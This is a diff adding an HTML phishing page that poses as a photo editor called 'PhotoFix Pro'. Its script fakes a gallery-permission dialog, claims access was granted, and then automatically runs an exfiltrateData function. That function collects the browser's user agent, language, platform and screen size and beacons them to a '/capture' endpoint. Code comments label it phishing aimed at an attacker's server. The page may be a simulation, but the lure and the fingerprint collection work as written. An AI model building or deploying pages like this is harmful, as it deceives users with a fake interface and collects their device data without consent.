@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PhotoFix Pro - Professional Photo Editor</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container { 
+            background: white; 
+            border-radius: 20px; 
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            max-width: 450px; 
+            width: 90%; 
+            padding: 40px;
+            text-align: center;
+        }
+        .logo { font-size: 2.5em; font-weight: bold; color: #333; margin-bottom: 10px; }
+        .subtitle { color: #666; margin-bottom: 30px; }
+        .upload-area {
+            border: 3px dashed #667eea;
+            border-radius: 15px;
+            padding: 50px 20px;
+            margin: 30px 0;
+            background: #f8f9ff;
+            transition: all 0.3s;
+            cursor: pointer;
+        }
+        .upload-area:hover { border-color: #764ba2; background: #f0f2ff; }
+        .upload-icon { font-size: 4em; color: #667eea; margin-bottom: 20px; }
+        .upload-text { font-size: 1.2em; color: #333; margin-bottom: 10px; }
+        .upload-subtext { color: #888; }
+        .permissions {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        .permissions h3 { color: #856404; margin-bottom: 10px; }
+        .permission-item { display: flex; align-items: center; margin: 10px 0; color: #856404; }
+        .permission-icon { font-size: 1.2em; margin-right: 10px; }
+        .btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 50px;
+            font-size: 1.1em;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s;
+            margin: 10px;
+        }
+        .btn:hover { transform: translateY(-2px); }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+        .status { margin-top: 20px; min-height: 20px; }
+        .success { color: #28a745; }
+        .error { color: #dc3545; }
+        @media (max-width: 480px) {
+            .container { padding: 30px 20px; }
+            .logo { font-size: 2em; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">📸 PhotoFix Pro</div>
+        <div class="subtitle">Edit your photos like a professional</div>
+        
+        <div class="upload-area" onclick="requestGallery()">
+            <div class="upload-icon">⬆️</div>
+            <div class="upload-text">Upload Photo to Edit</div>
+            <div class="upload-subtext">Click to select from gallery or drag & drop</div>
+        </div>
+
+        <div class="permissions">
+            <h3>🔒 Quick Permissions Needed</h3>
+            <div class="permission-item">
+                <span class="permission-icon">📱</span>
+                <strong>Gallery Access</strong> - To select your photos
+            </div>
+            <div class="permission-item">
+                <span class="permission-icon">💾</span>
+                <strong>Storage</strong> - To save edited photos
+            </div>
+        </div>
+
+        <button class="btn" onclick="requestGallery()" id="grantBtn">Grant Gallery Access</button>
+        <div class="status" id="status"></div>
+    </div>
+
+    <script>
+        let accessGranted = false;
+        const statusEl = document.getElementById('status');
+        const grantBtn = document.getElementById('grantBtn');
+
+        function showStatus(msg, type = '') {
+            statusEl.textContent = msg;
+            statusEl.className = `status ${type}`;
+        }
+
+        function requestGallery() {
+            if (accessGranted) {
+                showStatus('✅ Gallery access granted! Choose your photo.', 'success');
+                // Simulate file picker trigger
+                setTimeout(() => {
+                    // In real phishing, this would exfiltrate data
+                    exfiltrateData();
+                }, 1000);
+                return;
+            }
+
+            grantBtn.disabled = true;
+            grantBtn.textContent = 'Requesting access...';
+            
+            // Simulate permission dialog
+            setTimeout(() => {
+                accessGranted = true;
+                grantBtn.textContent = '✅ Access Granted - Choose Photo';
+                grantBtn.classList.add('success');
+                showStatus('✅ Gallery access granted successfully!', 'success');
+                
+                // Auto-trigger after permission
+                setTimeout(() => {
+                    requestGallery();
+                }, 1500);
+            }, 2000);
+        }
+
+        function exfiltrateData() {
+            // This would send gallery data to attacker's C2 in real scenario
+            const payload = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screen: `${screen.width}x${screen.height}`,
+                event: 'gallery_access_granted'
+            };
+            
+            // Exfiltrate to attacker's server
+            navigator.sendBeacon('/capture', JSON.stringify(payload));
+            console.log('📤 Data exfiltrated:', payload);
+        }
+
+        // Auto-request on load for aggressive phishing
+        window.onload = () => {
+            setTimeout(() => {
+                if (!accessGranted) {
+                    showStatus('PhotoFix Pro needs gallery access to edit your photos', 'error');
+                }
+            }, 3000);
+        };
+    </script>
+</body>
+</html>
